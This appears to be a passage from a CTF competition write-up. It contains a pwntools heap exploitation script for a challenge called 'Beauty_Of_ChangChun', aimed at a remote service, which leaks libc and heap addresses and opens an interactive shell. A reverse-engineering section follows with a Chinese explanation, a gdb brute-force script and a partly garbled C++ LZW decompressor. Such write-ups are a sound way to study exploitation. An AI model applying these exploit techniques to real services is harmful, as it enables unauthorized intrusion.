Beauty_Of_ChangChun 
from pwn import * 
context.log_level="debug" 
def cmd(ch): 
p.sendlineafter("ry\n",str(ch)) 
def add(size): 
cmd(1) 
p.sendlineafter(":\n",str(size)) 
def delete(index): 
cmd(2) 
p.sendlineafter(":\n",str(index)) 
def edit(index,note): 
cmd(3) 
p.sendlineafter(":\n",str(index)) 
p.sendafter(":\n",note) 
def show(index): 
cmd(4) 
p.sendlineafter(":\n",str(index)) 
#p=process("./pwn-5") 
p=remote("112.126.71.170",43652) 
p.recvuntil("e\n") 
gift=int(p.recvuntil("\n"),16) 
info(hex(gift)) 
for i in range(7): 
add(0xf9) 
delete(0) 
add(0x80) 
delete(0) 
add(0xf9) 
add(0x80) 
add(0x100) 
delete(1) 
add(0x90) 
delete(1) 
delete(2) 
show(2) 
p.recvuntil("see\n") 
libc=u64(p.recv(6)+"\x00\x00") 
print hex(libc) 
add(0xf9) 
delete(0) 
delete(1) 
show(2) 
#edit(2,p64()+p64()) 
p.recvuntil("see\n") 
heap=u64(p.recv(6)+"\x00\x00") 
print hex(heap) 
cmd(666) 
cmd(5) 
p.send("aaaaa") 
edit(2,p64(heap)+p64(gift-0x10)) 
add(0xf9) 
edit(2,p64(libc+0x100)) 
cmd(5) 
p.sendlineafter("idx\n",str(2)) 
p.interactive() 
RE 
re1 
通过逆向发现 flag 的每一位都采用相同的加密方式，然后会在函数末尾判断，所以直接写一
个 gdb 脚本爆破明文对应密文的关系即可 
gdb 脚本： 
b *(0x8000000 + 0x18096) 
python f = open('log','w+') 
set $ipx = 0x20 
r  
#include  
#include  
#include  
#include  
#include  
using namespace std; 
class LZW_Decompressor 
{ 
    public: 
        LZW_Decompressor(); 
        ~LZW_Decompressor(){}; 
        size_t get_max_dictionary_size() { return Max_DICTIONARY_SIZE; } 
        std::string get_output() { return output; } 
        std::map get_dictionary() { return dictionary; } 
        void decompress(vector input_buffer); 
        void add_dictionary_entry( std::string sequence ); 
        void initialise_dictionary(); 
        void reinitialise(); 
    protected: 
    private: 
        std::map dictionary; 
        std::string output, prev_sequence; 
        size_t Max_DICTIONARY_SIZE = 4096; // Maximum of 2^12 codes  
        size_t BUFFER_SIZE = 900; // Buffer has to be multiple of 3 
}; 
LZW_Decompressor::LZW_Decompressor() { 
    // Initialise dictionary entries 
    initialise_dictionary(); 
} 
void LZW_Decompressor::add_dictionary_entry( std::string sequence ) { 
    if( dictionary.size() >= Max_DICTIONARY_SIZE ) { 
        initialise_dictionary(); 
    } 
    dictionary.insert( std::pair( dictionary.size(), sequence ) ); 
} 
void LZW_Decompressor::initialise_dictionary() { 
    dictionary.clear(); 
    for( int i=0; i( i, std::string( 1, (uint8_t) i ) ) ); 
    } 
    dictionary.insert( std::pair( 0x100, std::string( 1, (uint8_t) 'f' ) ) ); 
    dictionary.insert( std::pair( 0x101, std::string( 1, (uint8_t) 'u' ) ) ); 
    dictionary.insert( std::pair( 0x102, std::string( 1, (uint8_t) 'k' ) ) ); 
} 
void LZW_Decompressor::reinitialise() { 
    initialise_dictionary(); 
    output = ""; 
    prev_sequence = ""; 
} 
void LZW_Decompressor::decompress(vector input_buffer) { 
    std::string current_code, next_code, current_sequence, next_sequence, new_entry, decoded_input; 
    size_t input_size = input_buffer.size(); 
    prev_sequence = dictionary.at( input_buffer[0] ); 
    decoded_input = prev_sequence; 
    for( size_t i=1; i<input_size; i += 1)  
    { 
        // Split input into 24 bit sections ( pairs of codes ) equivalent to 3 characters 
        uint32_t code_pair = input_buffer[i]; 
        try { 
            // Decode the 12 bit codes using the dictionary 
            next_sequence = dictionary.at( code_pair ); 
        }catch( std::out_of_range e ) { 
            // If the current code is unrecognised use first letter from previous code appended to the previous s
equence  
            next_sequence = prev_sequence + prev_sequence[0]; 
        } 
        // Add first sequence in code pair and first letter from the second sequence in code pair to dictionary 